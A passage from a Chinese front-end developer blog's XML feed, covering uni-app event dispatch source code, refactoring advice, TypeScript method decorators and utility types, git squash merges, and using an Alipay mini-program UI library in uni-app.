 <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// [['handle',[1,2,a]],['handle1',[1,2,a]]]</span>  <span class="token keyword">const</span> eventType <span class="token operator">=</span> event<span class="token punctuation">.</span>type  <span class="token keyword">const</span> ret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  eventOpts<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>eventOpt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> type <span class="token operator">=</span> eventOpt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> eventsArray <span class="token operator">=</span> eventOpt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> isCustom <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> CUSTOM    type <span class="token operator">=</span> isCustom <span class="token operator">?</span> type<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> type    <span class="token keyword">const</span> isOnce <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> ONCE    type <span class="token operator">=</span> isOnce <span class="token operator">?</span> type<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> type    <span class="token keyword">if</span> <span class="token punctuation">(</span>eventsArray <span class="token operator">&amp;&amp;</span> <span class="token function">isMatchEventType</span><span class="token punctuation">(</span>eventType<span class="token punctuation">,</span> type<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      eventsArray<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>eventArray <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> methodName <span class="token operator">=</span> eventArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>methodName<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">let</span> handlerCtx <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$vm          <span class="token keyword">if</span> <span class="token punctuation">(</span>handlerCtx<span class="token punctuation">.</span>$options<span class="token punctuation">.</span>generic<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// mp-weixin,mp-toutiao 抽象节点模拟 scoped slots</span>            handlerCtx <span class="token operator">=</span> <span class="token function">getContextVm</span><span class="token punctuation">(</span>handlerCtx<span class="token punctuation">)</span> <span class="token operator">||</span> handlerCtx          <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>methodName <span class="token operator">===</span> <span class="token string">'$emit'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            handlerCtx<span class="token punctuation">.</span>$emit<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>handlerCtx<span class="token punctuation">,</span>              <span class="token function">processEventArgs</span><span class="token punctuation">(</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">,</span>                event<span class="token punctuation">,</span>                eventArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                eventArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                isCustom<span class="token punctuation">,</span>                methodName              <span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>          <span class="token punctuation">}</span>          <span class="token keyword">const</span> handler <span class="token operator">=</span> handlerCtx<span class="token punctuation">[</span>methodName<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isFn</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">` _vm.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>methodName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is not a function`</span></span><span class="token punctuation">)</span>          <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>isOnce<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>handler<span class="token punctuation">.</span>once<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">return</span>            <span class="token punctuation">}</span>            handler<span class="token punctuation">.</span>once <span class="token operator">=</span> <span class="token boolean">true</span>          <span class="token punctuation">}</span>          <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token function">processEventArgs</span><span class="token punctuation">(</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>$vm<span class="token punctuation">,</span>            event<span class="token punctuation">,</span>            eventArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            eventArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            isCustom<span class="token punctuation">,</span>            methodName          <span class="token punctuation">)</span>          params <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token operator">?</span> params <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token comment" spellcheck="true">// 参数尾部增加原始事件对象用于复杂表达式内获取额外数据</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/=\s*\S+\.eventParams\s*\|\|\s*\S+\[['"]event-params['"]\]/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>handler<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// eslint-disable-next-line no-sparse-arrays</span>            params <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token punctuation">,</span> event<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span>          ret<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>handler<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>handlerCtx<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>    eventType <span class="token operator">===</span> <span class="token string">'input'</span> <span class="token operator">&amp;&amp;</span>    ret<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span>    <span class="token keyword">typeof</span> ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'undefined'</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>代码有点长，但还是比较清晰的，函数对事件分类进行处理，最终事件函数被调用执行，也就是<code>handler.apply(handlerCtx, params)</code>,关键词 apply，寻找这个词，基本就能够找到函数的调用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://uniapp.dcloud.io/component/mp-weixin-plugin" target="_blank" rel="noopener">小程序插件 - uni-app官网</a></li><li><a href="https://github.com/dcloudio/uni-app/pull/2759" target="_blank" rel="noopener">fix: 支付宝小程序 life-follow 事件去掉修饰符 by Yaob1990 · Pull Request #2759 · dcloudio/uni-app</a></li><li><a href="https://github.com/dcloudio/uni-app/commit/92d682a11a27d8fda573555512fff69a94a94e40" target="_blank" rel="noopener">fix:(mp-alipay): 支付宝小程序平台增加独有内置组件判断 #2410#issuecomment-878974559 · dcloudio/uni-app@92d682a</a></li><li><a href="https://juejin.cn/post/6968438754180595742#heading-22" target="_blank" rel="noopener">uni-app是如何构建小程序的？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重构 uniapp 项目(0)：相信自己</title>
      <link href="/2021/07/16/front-end/refactoring-believe-yourself/"/>
      <url>/2021/07/16/front-end/refactoring-believe-yourself/</url>
      
        <content type="html"><![CDATA[<p>  重构不是一个好活，需要对技术和业务的多重理解，重构又是一个好活，能够站在更加全然的高度，去俯视项目，给项目做手术。</p><h2 id="前端重构"><a href="#前端重构" class="headerlink" title="前端重构"></a>前端重构</h2><p>  前端重构高度依赖 git 信息，人员变动，业务变动，会导致原有的项目结构出现各种变动，命名可能不再语义化，逻辑不再清晰，写法可能千姿百态。如果没有或者丢失 git 信息，那你将寸步难行。</p><p>  挺羡慕后端，重构也不是什么大不了的事情，只要测试用例都过，基本是完成了 80%，后端的重构给人一种安全和确定感，前端的重构，有一种两眼一抹黑的感觉。</p><h2 id="能不能不重构"><a href="#能不能不重构" class="headerlink" title="能不能不重构"></a>能不能不重构</h2><p>  这个问题很难去回答。开发过程中应该有意识的进行一部分重构，对于不好的写法，腐败的味道及时剔除，那这样的项目可能就不存在问题，因为重构已经是它的一部分。</p><p>  而对于没有强力执行的项目，长期迭代，屎山堆积的项目，请慎重考虑重构。</p><h2 id="重构中的压力"><a href="#重构中的压力" class="headerlink" title="重构中的压力"></a>重构中的压力</h2><p>  如果很幸运，领导也支持，那么推行重构过程中你还将面临一些压力。</p><p>  项目无法运行。这几乎不可能，现代 IDE 提供很好的错误机制，这类错误可以很快的去定位到。</p><p>  项目中各种黑魔法。比如我遇到 uniapp 中，没有引入注册子组件，但是它竟然可以正常使用，可能是它的父级或者兄弟组件使用，使得它这里也能正常使用。这种问题，一般能够在项目测试中发现。</p><p>  无法实现优化目标。多套开发环境，需要手动去切换请求地址，开始没有什么思路，后续思考尝试了多种方式，最终通过 vue 环境变量的方式实现。如果某些功能，你确实无法实现，不要放弃，给自己一点时间，本次无法优化，可以放到后续，平时业务中去优化。</p><p>  线上事故。即使你对自己的重构非常有信心，测试也尽心尽力，每一个地方都点了。但是你依然无法避免线上事故。因为有测试同事的介入，这个事故应该是不严重的，它不会阻塞你的主流程，也不会对你的业务造成实质性的影响。最坏最坏，提桶跑路咯，如果一个公司对于犯错 0 容忍，那这并不是你的问题，是这个机制的问题，它并没有给线上 0 事故提供一系列的制度保证。（其实，这也保证不了，google，apple，这种量级的公司每年都有线上事故，黑天鹅永远存在）</p><h2 id="大胆重构，挥舞你的手术刀"><a href="#大胆重构，挥舞你的手术刀" class="headerlink" title="大胆重构，挥舞你的手术刀"></a>大胆重构，挥舞你的手术刀</h2><p>  梳理项目结构，非公共模块，不要放到公共目录中，该移动的移动，该合并的合并。</p><p>  消灭黑魔法，用前端的视角，给项目注入新的生命力，不要再纠结项目怎么这样神奇的运行了，手起刀落，用最稳妥的方式，把黑魔法消灭。</p><p>  更新项目依赖 <code>package.json</code> 。不要直接全部更新，项目中如果某些功能确实需要新的依赖支持，尝试单独去更新这部分依赖，比如我的 uniapp 项目不支持可选链，那我去更新它的 <code>babel</code> 依赖就可以了，尽量小的修改，避免引入过多的外界因素。</p><p>  拦路虎，消灭或者绕过。我选择了消灭，比如 <code>life-follow</code> 这个组件，始终无法正常使用，我深入研究了 uniapp 的事件机制，给官方提交了 mr，推动了支付宝 <code>life-follow</code> 在 uniapp 中的正常使用。</p><p>  信任 IDE。移动文件位置，优化导入，这些事情，请大胆放心的交给 IDE ，不要再去一个一个的写它的路径，IDE 非常擅长这些事情。</p><p>  引入新思路。重构是对过去的一次修补，也是对未来的一种开拓和展望。尝试在重构中通过命令进行环境判断、装饰器模式进行埋点、非生产环境不上报 log 数据。这些本该是项目的一部分，然而，因为各种原因，需要靠一次重构去实现，这也许也是重构的价值，角度不一样，思路也不一样。</p><h2 id="相信自己"><a href="#相信自己" class="headerlink" title="相信自己"></a>相信自己</h2><p>大胆假设，小心求证，相信你一定可以把项目梳理的井井有条，自己和项目都能够快速成长。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/dcloudio/uni-app/issues/2410" target="_blank" rel="noopener">支付宝小程序使用花呗分期插件，⽆法监听到插件提供的onChange事件，报错为事件信息不存在。 · Issue #2410 · dcloudio/uni-app</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ts 方法装饰器</title>
      <link href="/2021/07/12/front-end/method-decorator/"/>
      <url>/2021/07/12/front-end/method-decorator/</url>
      
        <content type="html"><![CDATA[<p>装饰器在java中叫注解，体现了面向切面（AOP）的编程思想。</p><h2 id="方法装饰器"><a href="#方法装饰器" class="headerlink" title="方法装饰器"></a>方法装饰器</h2><pre class=" language-typescript"><code class="language-typescript"><span class="token comment" spellcheck="true">// 定义装饰器</span><span class="token keyword">export</span>  <span class="token keyword">function</span> <span class="token function">logger</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">,</span> propertyKey<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">,</span> descriptor<span class="token punctuation">:</span> PropertyDescriptor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"初始化"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> original <span class="token operator">=</span> descriptor<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    descriptor<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>        <span class="token keyword">const</span> result <span class="token operator">=</span> original<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">Vue</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> title <span class="token operator">=</span> <span class="token string">"学习装饰器"</span>  <span class="token comment" spellcheck="true">// 使用装饰器</span>  @logger  <span class="token keyword">private</span> <span class="token function">imgClick</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"图片被点击"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="参数详解："><a href="#参数详解：" class="headerlink" title="参数详解："></a>参数详解：</h3><ul><li>target：类，也就是这里的 <code>Index</code></li><li>propertyKey：类属性函数的名称，这里是 <code>imgClick</code></li><li>descriptor：属性描述符，通过descriptor上面的属性，即可实现属性只读，数据重写等功能</li></ul><p>使用装饰器后，初始化时候会打印 <code>初始化</code>，descriptor.value 获取绑定的函数<code>imgClick</code>，对<code>imgClick</code>进行重写，打印参数，输出结果。</p><p>看起来比较复杂的装饰器，在一步一步的分支之后，也挺好理解的，本质上我们使用方法装饰器，往往是对方法的重写，或者是执行 f(g(fn()))类似的函数。</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ol><li>防抖节流</li><li>埋点</li><li>…<br>任何和主业务无关，可以被提炼出公共函数的场景都可以尝试使用装饰器去实现。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git merge --squash</title>
      <link href="/2021/07/07/tool/git-squash-merge/"/>
      <url>/2021/07/07/tool/git-squash-merge/</url>
      
        <content type="html"><![CDATA[<p>在开发过程中，git squash merge 是个比较低频使用的命令，这也是一个比较危险的命令（操作 git 记录），如果你不明白他的真实用途，建议不要使用。</p><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>如果你在gitlab合并分支提交的时候勾选了<code>squash</code>选项，那么你的多个git提交记录会被合成一个提交记录，默认的提交名称变为<code>Merge branch &#39;branch-d&#39; into &#39;master&#39;</code><br><img src="/images/16256150683432.jpg"></p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/16256149942897.jpg"></p><ul><li>你的代码确实被合入了主分支，但是commit记录全丢</li><li>如果你继续用本地分支提交代码，你会发现，我自己和自己冲突了，what fuck ？？？？</li></ul><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><code>git squash</code> 就是用来改写提交记录，压缩commit的，这就是它本来的用法鸭~，错的不是git，错的是你。。。。你不该选择 git merge –squash 。</p><p>master 视角<br><img src="/images/16256154828571.jpg"></p><p>branch e 视角<br><img src="/images/16256156817818.jpg"></p><p>上图 <code>Branch e</code> 被合入 <code>master</code> 分支，<code>Branch e</code> 有多个提交，被压缩成一个提交。这个提交是一个全新的提交，和 <code>Branch e</code> 没有任何关系，hash 也完全不同。所以现在<code>master</code>和<code>Branch e</code> 是两条平行线。这就解释了为啥自己和自己冲突，因为master，确实多了commit记录，但是因为 hash 完全不同，没办法和其他分支做关联。如果需要出现交汇点，你需要从 master 再 merge 到 <code>branch e</code>。</p><p>是不是觉得<code>git</code>太不人性化了，太蠢了？em……</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 uniapp 中使用小程序ui组件库（mini-ali-ui-rpx）</title>
      <link href="/2021/06/17/front-end/use-mini-ali-ui-rpx-in-uniapp/"/>
      <url>/2021/06/17/front-end/use-mini-ali-ui-rpx-in-uniapp/</url>
      
        <content type="html"><![CDATA[<p>uniapp 提供了很多开箱即用的特性，但是业务开发中，好像很少使用原生的小程序组件，这个特性是支持的。从 uniapp 开发者角度，支持原生小程序特性有利于开发者对现有的小程序做快速迁移，能够兼容社区绝大多数 ui 组件库。</p><h2 id="引入小程序组件（以支付宝小程序为例）"><a href="#引入小程序组件（以支付宝小程序为例）" class="headerlink" title="引入小程序组件（以支付宝小程序为例）"></a>引入小程序组件（以支付宝小程序为例）</h2><ol><li><p>在 src 目录中新建 <code>wxcomponents/mycomponents</code> 文件夹，用于存放小程序组件</p></li><li><p>使用：在 pages.json 的 globalStyle -&gt; usingComponents 引入组件，注意这里必须是全局而不是页面级别。<br> <img src="/images/16238837739805.jpg"></p></li><li><p>在页面中使用</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 页面模板 (index.vue) --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 在页面中对自定义组件进行引用 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>custom</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>uni-app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>custom</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre><h2 id="引入-mini-ali-ui-rpx"><a href="#引入-mini-ali-ui-rpx" class="headerlink" title="引入 mini-ali-ui-rpx"></a>引入 mini-ali-ui-rpx</h2><ol><li><p>通过 npm 下载 <code>mini-ali-ui-rpx</code> 文件</p></li><li><p>复制 <code>mini-ali-ui-rpx</code> 到 <code>mycomponents</code> 文件夹下</p></li><li><p>在 pages.json 的 globalStyle -&gt; usingComponents 引入组件，注意如果使用的组件依赖一些基础组件，如<code>am-icon/am-button</code>，这些组件必须也要被引入，否则找不到组件，报错。</p><p>代码地址：<a href="https://github.com/Yaob1990/use-mini-ali-ui-rpx-in-uniapp" target="_blank" rel="noopener">Yaob1990/use-mini-ali-ui-rpx-in-uniapp: 在 uniapp 中使用 mini-ali-ui-rpx</a></p><p>在线预览（加载较慢😭）：<a href="http://42.192.184.113:40425/" target="_blank" rel="noopener">http://42.192.184.113:40425/</a></p></li></ol></li></ol><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://uniapp.dcloud.io/frame?id=%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E6%94%AF%E6%8C%81" target="_blank" rel="noopener">框架简介 - uni-app官网</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解 ts 中的 utility 类型</title>
      <link href="/2021/05/25/front-end/typescript-utility-types/"/>
      <url>/2021/05/25/front-end/typescript-utility-types/</url>
      
        <content type="html"><![CDATA[<p>平时开发中，有些场景总有种蹩手蹩脚的感觉，看到 Utility Types 才知道自己 native 了，很多场景 ts 都帮我们想好了。</p><h2 id="Partial"><a href="#Partial" class="headerlink" title="Partial"></a>Partial<Type></h2><p>设置 Type 某个类型为可选，并返回部分 Type 类型。</p><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-ts"><code class="language-ts">type Partial<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>P <span class="token keyword">in</span> keyof T<span class="token punctuation">]</span><span class="token operator">?</span><span class="token punctuation">:</span> T<span class="token punctuation">[</span>P<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">Todo</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span>  description<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">updateTodo</span><span class="token punctuation">(</span>todo<span class="token punctuation">:</span> Todo<span class="token punctuation">,</span> fieldsToUpdate<span class="token punctuation">:</span> Partial<span class="token operator">&lt;</span>Todo<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token operator">...</span>todo<span class="token punctuation">,</span> <span class="token operator">...</span>fieldsToUpdate <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> todo1 <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">"organize desk"</span><span class="token punctuation">,</span>  description<span class="token punctuation">:</span> <span class="token string">"clear clutter"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> todo2 <span class="token operator">=</span> <span class="token function">updateTodo</span><span class="token punctuation">(</span>todo1<span class="token punctuation">,</span> <span class="token punctuation">{</span>  description<span class="token punctuation">:</span> <span class="token string">"throw out trash"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Required"><a href="#Required" class="headerlink" title="Required"></a>Required<Type></h2><p>Type 类型里面的某个类型为必要类型（必选项）。</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Required<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span>P <span class="token keyword">in</span> keyof T<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">?</span><span class="token punctuation">:</span> T<span class="token punctuation">[</span>P<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><code>-?</code> 表示移除可选性<code>?</code>，这里移除指把可选项改为必选项，而不是移除可选项。</p><h3 id="例-1"><a href="#例-1" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">Props</span> <span class="token punctuation">{</span>  a<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">;</span>  b<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> obj<span class="token punctuation">:</span> Props <span class="token operator">=</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 报错，确少 b 类型</span><span class="token keyword">const</span> obj2<span class="token punctuation">:</span> Required<span class="token operator">&lt;</span>Props<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="Readonly"><a href="#Readonly" class="headerlink" title="Readonly"></a>Readonly<Type></h2><p>只读属性，不可改写。</p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Readonly<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span> readonly <span class="token punctuation">[</span>P <span class="token keyword">in</span> keyof T<span class="token punctuation">]</span><span class="token punctuation">:</span> T<span class="token punctuation">[</span>P<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="例-2"><a href="#例-2" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">Todo</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> todo<span class="token punctuation">:</span> Readonly<span class="token operator">&lt;</span>Todo<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">"Delete inactive users"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 报错，不能被重新赋值</span>todo<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span></code></pre><h2 id="Record-lt-Keys-Type-gt"><a href="#Record-lt-Keys-Type-gt" class="headerlink" title="Record&lt;Keys,Type&gt;"></a>Record&lt;Keys,Type&gt;</h2><p>将 <code>Kyes</code> 的类型转化为 <code>Type</code> 的类型，类似于类型扩展。</p><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Record<span class="token operator">&lt;</span>K <span class="token keyword">extends</span> <span class="token class-name">keyof</span> <span class="token keyword">any</span><span class="token punctuation">,</span> T<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span>P <span class="token keyword">in</span> K<span class="token punctuation">]</span><span class="token punctuation">:</span> T<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="例-3"><a href="#例-3" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">CatInfo</span> <span class="token punctuation">{</span>  age<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">;</span>  breed<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span><span class="token punctuation">}</span>type CatName <span class="token operator">=</span> <span class="token string">"miffy"</span> <span class="token operator">|</span> <span class="token string">"boris"</span> <span class="token operator">|</span> <span class="token string">"mordred"</span><span class="token punctuation">;</span><span class="token keyword">const</span> cats<span class="token punctuation">:</span> Record<span class="token operator">&lt;</span>CatName<span class="token punctuation">,</span> CatInfo<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span>  miffy<span class="token punctuation">:</span> <span class="token punctuation">{</span> age<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> breed<span class="token punctuation">:</span> <span class="token 